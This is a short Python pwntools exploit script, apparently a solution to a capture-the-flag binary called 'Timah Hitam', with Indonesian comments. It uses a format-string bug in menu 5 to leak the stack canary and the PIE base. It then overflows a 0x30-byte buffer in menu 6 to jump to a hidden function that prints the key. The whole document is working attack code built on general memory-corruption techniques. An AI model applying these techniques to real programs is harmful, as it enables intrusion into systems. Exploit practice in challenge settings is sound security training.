#!/usr/bin/env python3
"""Timah Hitam - format-string leak (menu 5) + stack overflow (menu 6) -> fungsi tersembunyi."""
import sys
from pwn import *

context.arch = 'amd64'
context.log_level = 'warn'

HIDDEN = 0x1a1d          # fungsi tersembunyi yang mencetak kunci
RET_LAPOR = 0x1989       # alamat balik fcn.000017b7 ke main (untuk hitung PIE base)

def menu(io, n):
    io.recvuntil(b'pilih: ')
    io.sendline(str(n).encode())

def bocorkan(io):
    """Menu 5: printf(buf) tanpa format -> bocorkan canary + basis PIE."""
    menu(io, 5)
    io.recvuntil(b'deskripsi: ')
    io.sendline(b'%15$p|%17$p')            # slot 15 = canary, slot 17 = return address
    io.recvuntil(b'laporan diterima: ')
    canary, ret = (int(x, 16) for x in io.recvline().strip().split(b'|'))
    return canary, ret - RET_LAPOR

def buka(io, canary, base):
    """Menu 6: read 0x80 ke buffer 0x30 -> timpa canary asli + return ke fungsi tersembunyi."""
    menu(io, 6)
    io.recvuntil(b'kode akses:')
    io.sendline(flat({40: [canary, b'BBBBBBBB', base + HIDDEN]}))

io = remote(*sys.argv[1].split(':')) if len(sys.argv) > 1 else process('./timah_hitam.bin')
canary, base = bocorkan(io)
log.warn(f'canary   = {canary:#018x}')
log.warn(f'PIE base = {base:#014x}')
assert canary & 0xff == 0, 'canary harus berakhir 0x00'
assert base & 0xfff == 0, 'basis PIE harus rata halaman'
buka(io, canary, base)
print(io.recvall(timeout=5).decode(errors='replace').strip())
